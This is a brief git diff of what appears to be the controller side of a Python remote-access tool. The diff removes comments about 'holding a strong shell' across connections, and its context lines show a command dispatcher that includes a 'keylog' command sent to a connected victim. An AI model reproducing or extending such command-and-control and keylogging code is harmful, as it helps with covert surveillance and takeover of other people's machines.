@@ -6,10 +6,6 @@ from socket import error as socket_error
 from utils.crypto import crypto_run
 
 
-# hold strong shell on one connection
-# then expand for multi pool + current shell
-
-
 def get_cmd():
     cmd = ""
     while cmd == "":
@@ -86,12 +82,9 @@ def builtin_cmds(conn, cmd, shell_port, status):
         conn = send_cmd(conn, cmd)
         conn, msg = recv_msg(conn, 64000)
     elif cmd[:6] == "keylog":
-        # run keylogger command
         conn = send_cmd(conn, cmd[:6])
         conn, msg = recv_msg(conn, 4096)
     else:
-        # conn = send_cmd(conn, cmd)
-        # builtin_cmds(conn, cmd, shell_port, status)
         msg = "[x] Command not found"
     return conn, status, msg
 
